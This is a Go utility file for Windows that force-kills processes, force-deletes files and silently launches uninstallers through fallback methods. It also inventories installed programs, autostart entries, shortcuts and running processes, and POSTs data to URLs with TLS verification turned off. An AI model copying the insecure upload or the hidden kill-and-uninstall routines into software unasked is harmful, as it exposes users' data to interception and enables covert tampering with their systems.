package utils

import (
	"bytes"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"

	reg "golang.org/x/sys/windows/registry"
)

const (
	// 进程相关
	th32csSnapProcess = 0x00000002
	processTerminate  = 0x0001
	procQry           = 0x1000 // PROCESS_QUERY_LIMITED_INFORMATION
)

var (
	modKernel32 = syscall.NewLazyDLL("kernel32.dll")

	procCreateToolhelp32Snapshot = modKernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW          = modKernel32.NewProc("Process32FirstW")
	procProcess32NextW           = modKernel32.NewProc("Process32NextW")
	procOpenProcess              = modKernel32.NewProc("OpenProcess")
	procTerminateProcess         = modKernel32.NewProc("TerminateProcess")
	procQryImg                   = modKernel32.NewProc("QueryFullProcessImageNameW")
	procDeleteFileW              = modKernel32.NewProc("DeleteFileW")
)

// PROCESSENTRY32 结构
type processEntry32 struct {
	DwSize              uint32
	CntUsage            uint32
	Th32ProcessID       uint32
	Th32DefaultHeapID   uintptr
	Th32ModuleID        uint32
	CntThreads          uint32
	Th32ParentProcessID uint32
	PcPriClassBase      int32
	DwFlags             uint32
	SzExeFile           [260]uint16
}

func Kill(exeName string) error {
	exeName = strings.TrimSpace(exeName)
	if exeName == "" {
		return fmt.Errorf("空字符")
	}
	exeName = filepath.Base(exeName)
	if err := Killcmd(exeName); err == nil {
		return nil
	}
	if err := Killapi(exeName); err == nil {
		return nil
	}
	if err := Killos(exeName); err == nil {
		return nil
	}

	return fmt.Errorf("failed to kill %s by all methods", exeName)
}

func Killcmd(exeName string) error {
	cmd := exec.Command("taskkill", "/IM", exeName, "/F")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	return cmd.Run()
}

func Killapi(exeName string) error {
	pids, err := find(exeName)
	if err != nil {
		return err
	}
	if len(pids) == 0 {
		return fmt.Errorf("no process found: %s", exeName)
	}

	var lastErr error
	for _, pid := range pids {
		h, _, e := procOpenProcess.Call(
			uintptr(processTerminate),
			uintptr(0),
			uintptr(uint32(pid)),
		)
		if h == 0 {
			lastErr = fmt.Errorf("OpenProcess %d: %v", pid, e)
			continue
		}
		_, _, e2 := procTerminateProcess.Call(h, uintptr(1))
		syscall.CloseHandle(syscall.Handle(h))
		if e2 != syscall.Errno(0) && e2 != nil {
			lastErr = fmt.Errorf("TerminateProcess %d: %v", pid, e2)
		}
	}
	return lastErr
}

func Killos(exeName string) error {
	pids, err := find(exeName)
	if err != nil {
		return err
	}
	if len(pids) == 0 {
		return fmt.Errorf("no process found: %s", exeName)
	}

	var lastErr error
	for _, pid := range pids {
		p, err := os.FindProcess(pid)
		if err != nil {
			lastErr = err
			continue
		}
		if err = p.Kill(); err != nil {
			lastErr = err
		}
	}
	return lastErr
}

// 查找进程
func find(exeName string) ([]int, error) {
	target := strings.ToLower(exeName)

	snap, _, err := procCreateToolhelp32Snapshot.Call(
		uintptr(th32csSnapProcess),
		0,
	)
	const invalidHandle = ^uintptr(0)
	if snap == invalidHandle {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot: %v", err)
	}
	defer syscall.CloseHandle(syscall.Handle(snap))

	var pe processEntry32
	pe.DwSize = uint32(unsafe.Sizeof(pe))

	ret, _, err := procProcess32FirstW.Call(
		snap,
		uintptr(unsafe.Pointer(&pe)),
	)
	if ret == 0 {
		return nil, fmt.Errorf("Process32FirstW: %v", err)
	}

	var pids []int
	for {
		name := u16_str(pe.SzExeFile[:])
		if strings.EqualFold(name, target) {
			pids = append(pids, int(pe.Th32ProcessID))
		}

		ret, _, _ = procProcess32NextW.Call(
			snap,
			uintptr(unsafe.Pointer(&pe)),
		)
		if ret == 0 {
			break
		}
	}
	return pids, nil
}

// 进程是否存在
func HasProc(exeName string) bool {
	pids, err := find(exeName)
	if err != nil {
		return false
	}
	return len(pids) > 0
}

func u16_str(u []uint16) string {
	n := 0
	for n < len(u) && u[n] != 0 {
		n++
	}
	return string(utf16.Decode(u[:n]))
}

func Del(path string) error {
	if path == "" {
		return fmt.Errorf("空字符")
	}
	if err := os.Remove(path); err == nil {
		return nil
	}
	if err := delapi(path); err == nil {
		return nil
	}
	if err := delcmd(path); err == nil {
		return nil
	}
	return fmt.Errorf("failed to delete file: %s", path)
}

func delapi(path string) error {
	p16, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}

	r, _, e := procDeleteFileW.Call(uintptr(unsafe.Pointer(p16)))
	if r == 0 {
		if e != nil && e != syscall.Errno(0) {
			return e
		}
		return fmt.Errorf("DeleteFileW failed")
	}
	return nil
}

func delcmd(path string) error {
	cmd := exec.Command("cmd", "/C", "del", "/F", "/Q", path)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	return cmd.Run()
}

// 弹窗
func PopMsg(tit, msg string, btn, ico uint32) int {
	u32 := syscall.NewLazyDLL("user32.dll")
	mb := u32.NewProc("MessageBoxW")

	tPtr, _ := syscall.UTF16PtrFromString(msg)
	cPtr, _ := syscall.UTF16PtrFromString(tit)

	ret, _, _ := mb.Call(
		0,
		uintptr(unsafe.Pointer(tPtr)),
		uintptr(unsafe.Pointer(cPtr)),
		uintptr(btn|ico),
	)

	return int(ret)
}

// 简单判断系统是否有WebView2
func HasWV2() bool {
	const gu = `{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}`

	// 检测WebView2注册表
	if chkKey_pv(reg.LOCAL_MACHINE, `SOFTWARE\Microsoft\EdgeUpdate\Clients\`+gu) ||
		chkKey_pv(reg.LOCAL_MACHINE, `SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\Clients\`+gu) ||
		chkKey_pv(reg.CURRENT_USER, `SOFTWARE\Microsoft\EdgeUpdate\Clients\`+gu) {
		return true
	}

	msg := "缺少运行库 WebView2，是否安装？\n\n" +
		"是：安装运行库\n" +
		"否：退出\n" +
		"取消：继续运行"
	ret := PopMsg("提示", msg, 0x00000003, 0x00000030)

	switch ret {
	case 6: //是
		dir, err := os.Getwd()
		if err != nil {
			os.Exit(0)
			return false
		}
		p := filepath.Join(dir, "MicrosoftEdgeWebview2Setup.exe")
		cmd := exec.Command(p)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}
		_ = cmd.Start()
		os.Exit(0)
		return false

	case 7: // 否
		os.Exit(0)
		return false

	case 2: // 跳过
		return true

	default:
		// 调用失败跳过
		return true
	}
}

// 检查指定键是否且是否有“pv”
func chkKey_pv(root reg.Key, sub string) bool {
	k, err := reg.OpenKey(root, sub, reg.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer k.Close()

	if _, _, err = k.GetStringValue("pv"); err == nil {
		return true
	}
	return false
}

func normalizeUnName(name string) string {
	name = strings.ToLower(strings.TrimSpace(name))
	if name == "" {
		return ""
	}

	var b strings.Builder
	b.Grow(len(name))
	for _, r := range name {
		if r >= '0' && r <= '9' {
			continue
		}
		b.WriteRune(r)
	}
	return b.String()
}

// 在程序目录找到常见卸载程序
func FindUn(exePath string) (string, string, error) {
	exePath = filepath.Clean(exePath)
	if exePath == "" {
		return "", "", errors.New("exe 空")
	}

	uns := []string{
		"uninstall.exe",
		"uninstaller.exe",
		"uninst.exe",
		"unins000.exe",
		"unins001.exe",
		"unins002.exe",
		"unins003.exe",
		"unins004.exe",
		"remove.exe",
		"uninstall64.exe",
		"uninstall_x64.exe",
	}
	unsSet := make(map[string]struct{}, len(uns))
	for _, n := range uns {
		unsSet[normalizeUnName(n)] = struct{}{}
	}

	// 在单个目录中找
	fin := func(d string) (string, error) {
		ents, err := os.ReadDir(d)
		if err != nil {
			return "", err
		}

		var wild string
		for _, e := range ents {
			if e.IsDir() {
				continue
			}
			name := e.Name()
			norm := normalizeUnName(name)

			// 先去掉数字，再匹配常见卸载文件名
			if _, ok := unsSet[norm]; ok {
				return filepath.Join(d, name), nil
			}
			// 模糊匹配 unins/uninst，同样兼容数字穿插的文件名
			if wild == "" && (strings.Contains(norm, "unins") || strings.Contains(norm, "uninst")) {
				wild = filepath.Join(d, name)
			}
		}

		if wild != "" {
			return wild, nil
		}
		return "", errors.New("no uns")
	}

	// 往下搜索，最多找4层
	type dirNode struct {
		dir   string
		depth int
	}
	finDeep := func(root string, maxDepth int) (string, error) {
		ents, err := os.ReadDir(root)
		if err != nil {
			return "", err
		}

		// 起点
		q := make([]dirNode, 0, 32)
		for _, e := range ents {
			if !e.IsDir() {
				continue
			}
			q = append(q, dirNode{
				dir:   filepath.Join(root, e.Name()),
				depth: 1,
			})
		}

		for len(q) > 0 {
			n := q[0]
			q = q[1:]

			up, err := fin(n.dir)
			if err == nil {
				return up, nil
			}

			if n.depth >= maxDepth {
				continue
			}

			sub, err := os.ReadDir(n.dir)
			if err != nil {
				// 没权限/不存在直接跳过
				continue
			}
			for _, e := range sub {
				if !e.IsDir() {
					continue
				}
				q = append(q, dirNode{
					dir:   filepath.Join(n.dir, e.Name()),
					depth: n.depth + 1,
				})
			}
		}
		return "", errors.New("no uns")
	}

	// 先在 exe 目录找
	edir := filepath.Dir(exePath)
	edir = filepath.Clean(edir)

	if up, err := fin(edir); err == nil {
		// 设置工作目录为卸载程序所在目录
		return up, filepath.Dir(up), nil
	}

	// 用 folder.txt 获取安装目录
	self, e2 := os.Executable()
	if e2 != nil {
		return "", "", fmt.Errorf("get exe err: %w", e2)
	}
	sdir := filepath.Dir(self)
	ff := filepath.Join(sdir, "folder.txt")
	dat, e3 := os.ReadFile(ff)
	if e3 != nil {
		return "", "", fmt.Errorf("read folder.txt err: %w", e3)
	}

	var kws []string
	for _, ln := range strings.Split(string(dat), "\n") {
		ln = strings.TrimSpace(ln)
		if ln == "" {
			continue
		}
		if strings.HasPrefix(ln, "#") || strings.HasPrefix(ln, ";") {
			continue
		}
		kws = append(kws, strings.ToLower(ln))
	}
	if len(kws) == 0 {
		return "", "", errors.New("no kw")
	}

	// 从 exe 所在目录往上爬，用关键字找安装根目录
	dir := edir
	var id string
	for {
		bs := filepath.Base(dir)
		lb := strings.ToLower(bs)
		hit := false
		for _, kw := range kws {
			if lb == kw || strings.Contains(lb, kw) {
				id = dir
				hit = true
				break
			}
		}
		if hit {
			break
		}
		pd := filepath.Dir(dir)
		if pd == dir {
			break
		}
		dir = pd
	}

	if id == "" {
		return "", "", errors.New("no dir")
	}

	// 在安装目录扫一圈
	if up, err := fin(id); err == nil {
		return up, filepath.Dir(up), nil
	}

	// 向下搜索4层
	up, err := finDeep(id, 4)
	if err != nil {
		return "", "", fmt.Errorf("no uns in %s: %w", id, err)
	}

	return up, filepath.Dir(up), nil
}

// 为防止限制，用多种方式启动卸载程序
func RunUn(p, d string) error {
	if p == "" {
		return fmt.Errorf("空卸载路径")
	}

	time.Sleep(200 * time.Millisecond)

	var e1, e2, e3 error

	c := exec.Command(p)
	c.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	c.Dir = d
	e1 = c.Start()
	if e1 == nil {
		return nil
	}

	c = exec.Command("cmd", "/C", p)
	c.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	c.Dir = d
	e2 = c.Start()
	if e2 == nil {
		return nil
	}

	c = exec.Command("rundll32", "shell32.dll,ShellExec_RunDLL", p)
	c.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	c.Dir = d
	e3 = c.Start()
	if e3 == nil {
		return nil
	}

	return fmt.Errorf("run err: %v | %v | %v", e1, e2, e3)
}

// 尝试卸载
func Tryrm(exePath string) error {
	p, d, err := FindUn(exePath)
	if err != nil {
		return err
	}
	return RunUn(p, d)
}

func baseNoExt(n string) string {
	n = strings.TrimSpace(n)
	if n == "" {
		return ""
	}
	ext := filepath.Ext(n)
	if ext != "" {
		n = strings.TrimSuffix(n, ext)
	}
	return strings.TrimSpace(n)
}

// 取桌面lnk文件名
func DeskLst() []string {
	dirs := make([]string, 0, 6)
	add := func(p string) {
		p = strings.TrimSpace(p)
		if p == "" {
			return
		}
		if fi, err := os.Stat(p); err == nil && fi.IsDir() {
			dirs = append(dirs, p)
		}
	}

	up := os.Getenv("USERPROFILE")
	add(filepath.Join(up, "Desktop"))
	add(filepath.Join(up, "OneDrive", "Desktop"))
	add(filepath.Join(up, "OneDrive", "桌面"))
	od := os.Getenv("OneDrive")
	add(filepath.Join(od, "Desktop"))
	add(filepath.Join(od, "桌面"))
	pub := os.Getenv("PUBLIC")
	add(filepath.Join(pub, "Desktop"))

	out := make([]string, 0, 128)
	set := map[string]struct{}{}
	for _, d := range dirs {
		ents, err := os.ReadDir(d)
		if err != nil {
			continue
		}
		for _, e := range ents {
			if e.IsDir() {
				continue
			}
			n := e.Name()
			if !strings.EqualFold(filepath.Ext(n), ".lnk") {
				continue
			}
			bn := baseNoExt(n)
			if bn == "" {
				continue
			}
			k := strings.ToLower(bn)
			if _, ok := set[k]; ok {
				continue
			}
			set[k] = struct{}{}
			out = append(out, bn)
		}
	}
	return out
}

// 取开始菜单目录/文件名
func MenuLst() []string {
	root := `C:\ProgramData\Microsoft\Windows\Start Menu\Programs`
	ents, err := os.ReadDir(root)
	if err != nil {
		return []string{}
	}

	ch := make(chan string, 256)
	var wg sync.WaitGroup
	sem := make(chan struct{}, 8)

	for _, e := range ents {
		if e.IsDir() {
			dn := e.Name()
			wg.Add(1)
			sem <- struct{}{}
			go func(dn string) {
				defer wg.Done()
				defer func() { <-sem }()
				sub, err := os.ReadDir(filepath.Join(root, dn))
				if err != nil {
					return
				}
				for _, s := range sub {
					if s.IsDir() {
						continue
					}
					fn := baseNoExt(s.Name())
					if fn == "" {
						continue
					}
					ch <- filepath.ToSlash(filepath.Join(dn, fn))
				}
			}(dn)
			continue
		}

		fn := baseNoExt(e.Name())
		if fn != "" {
			ch <- fn
		}
	}

	go func() {
		wg.Wait()
		close(ch)
	}()

	out := make([]string, 0, 256)
	set := map[string]struct{}{}
	for s := range ch {
		if _, ok := set[s]; ok {
			continue
		}
		set[s] = struct{}{}
		out = append(out, s)
	}
	return out
}

// 取HKCU/HKLM启动项
func RunLst() ([]string, []string) {
	usr := runKey(reg.CURRENT_USER)
	mac := runKey(reg.LOCAL_MACHINE)
	return usr, mac
}

// 取启动项注册表
func runKey(root reg.Key) []string {
	sub := `Software\Microsoft\Windows\CurrentVersion\Run`
	k, err := reg.OpenKey(root, sub, reg.QUERY_VALUE)
	if err != nil {
		return []string{}
	}
	defer k.Close()

	ns, err := k.ReadValueNames(0)
	if err != nil {
		return []string{}
	}
	out := make([]string, 0, len(ns))
	set := map[string]struct{}{}
	for _, n := range ns {
		bn := baseNoExt(n)
		if bn == "" {
			continue
		}
		k2 := strings.ToLower(bn)
		if _, ok := set[k2]; ok {
			continue
		}
		set[k2] = struct{}{}
		out = append(out, bn)
	}
	return out
}

// 取注册表可卸载项
func UnLst() ([]string, []string) {
	x64 := unKey(`SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall`)
	x32 := unKey(`SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall`)
	return x64, x32
}

func unKey(sub string) []string {
	k, err := reg.OpenKey(reg.LOCAL_MACHINE, sub, reg.ENUMERATE_SUB_KEYS|reg.QUERY_VALUE)
	if err != nil {
		return []string{}
	}
	defer k.Close()

	ns, err := k.ReadSubKeyNames(-1)
	if err != nil {
		return []string{}
	}
	out := make([]string, 0, len(ns))
	set := map[string]struct{}{}
	for _, n := range ns {
		ck, err := reg.OpenKey(k, n, reg.QUERY_VALUE)
		if err != nil {
			continue
		}
		dn, _, err := ck.GetStringValue("DisplayName")
		ck.Close()
		if err != nil {
			continue
		}
		dn = strings.TrimSpace(dn)
		if dn == "" {
			continue
		}
		k2 := strings.ToLower(dn)
		if _, ok := set[k2]; ok {
			continue
		}
		set[k2] = struct{}{}
		out = append(out, dn)
	}
	return out
}

// 进程
type procInf struct {
	pid  uint32
	name string
}

// 枚举进程
func procAll() ([]procInf, error) {
	snap, _, err := procCreateToolhelp32Snapshot.Call(uintptr(th32csSnapProcess), 0)
	const inv = ^uintptr(0)
	if snap == inv {
		return nil, fmt.Errorf("snap: %v", err)
	}
	defer syscall.CloseHandle(syscall.Handle(snap))

	var pe processEntry32
	pe.DwSize = uint32(unsafe.Sizeof(pe))
	ret, _, err := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&pe)))
	if ret == 0 {
		return nil, fmt.Errorf("pfirst: %v", err)
	}

	out := make([]procInf, 0, 256)
	for {
		out = append(out, procInf{pid: pe.Th32ProcessID, name: u16_str(pe.SzExeFile[:])})
		ret, _, _ = procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&pe)))
		if ret == 0 {
			break
		}
	}
	return out, nil
}

// 取进程完整路径
func procPath(pid uint32) string {
	h, _, _ := procOpenProcess.Call(uintptr(procQry), 0, uintptr(pid))
	if h == 0 {
		return ""
	}
	defer syscall.CloseHandle(syscall.Handle(h))

	buf := make([]uint16, 32768)
	sz := uint32(len(buf))
	r, _, _ := procQryImg.Call(h, 0, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&sz)))
	if r == 0 || sz == 0 {
		return ""
	}
	return syscall.UTF16ToString(buf[:sz])
}

// 取路径上两层目录名
func Up2(p string) string {
	p = filepath.Clean(p)
	d1 := filepath.Dir(p)
	b1 := filepath.Base(d1)
	d2 := filepath.Dir(d1)
	if d2 == d1 || d2 == "." {
		return b1
	}
	b2 := filepath.Base(d2)
	if b2 == "" || b2 == "." {
		return b1
	}
	return filepath.ToSlash(filepath.Join(b2, b1))
}

// 取符合条件的进程列表
func ProcLst(kws []string) []string {
	ks := make([]string, 0, len(kws))
	for _, s := range kws {
		s = strings.TrimSpace(s)
		if s == "" {
			continue
		}
		if strings.HasPrefix(s, "#") || strings.HasPrefix(s, ";") {
			continue
		}
		ks = append(ks, strings.ToLower(s))
	}

	wind := strings.ToLower(os.Getenv("WINDIR"))
	if wind != "" {
		wind = strings.ToLower(filepath.Clean(wind))
	}

	ps, err := procAll()
	if err != nil {
		return []string{}
	}

	out := make([]string, 0, 256)
	set := map[string]struct{}{}
	for _, p := range ps {
		path := procPath(p.pid)
		if path == "" {
			continue
		}
		lp := strings.ToLower(path)

		// 系统目录过滤
		if wind != "" && strings.HasPrefix(lp, wind) {
			continue
		}
		if strings.Contains(lp, "\\windows\\") {
			continue
		}

		// folder.txt 过滤：命中则跳过
		dir := strings.ToLower(filepath.Dir(path))
		hit := false
		for _, k := range ks {
			if k != "" && strings.Contains(dir, k) {
				hit = true
				break
			}
		}
		if hit {
			continue
		}

		nm := baseNoExt(filepath.Base(p.name))
		if nm == "" {
			nm = baseNoExt(filepath.Base(path))
		}
		if nm == "" {
			continue
		}
		tag := Up2(path)
		if tag == "" {
			continue
		}

		s := nm + "==" + tag
		k := strings.ToLower(s)
		if _, ok := set[k]; ok {
			continue
		}
		set[k] = struct{}{}
		out = append(out, s)
	}
	return out
}

// 上传
func UpPost(urls []string, dat []byte) (string, error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cli := &http.Client{Timeout: 8 * time.Second, Transport: tr}

	var last error
	for _, u := range urls {
		u = strings.TrimSpace(u)
		if u == "" {
			continue
		}

		req, err := http.NewRequest("POST", u, bytes.NewReader(dat))
		if err != nil {
			last = err
			continue
		}
		req.Header.Set("Content-Type", "application/json")

		rsp, err := cli.Do(req)
		if err != nil {
			last = err
			continue
		}
		io.Copy(io.Discard, rsp.Body)
		rsp.Body.Close()

		if rsp.StatusCode >= 200 && rsp.StatusCode < 300 {
			return u, nil
		}
		last = fmt.Errorf("%s: %s", u, rsp.Status)
	}
	if last == nil {
		last = fmt.Errorf("no url")
	}
	return "", last
}
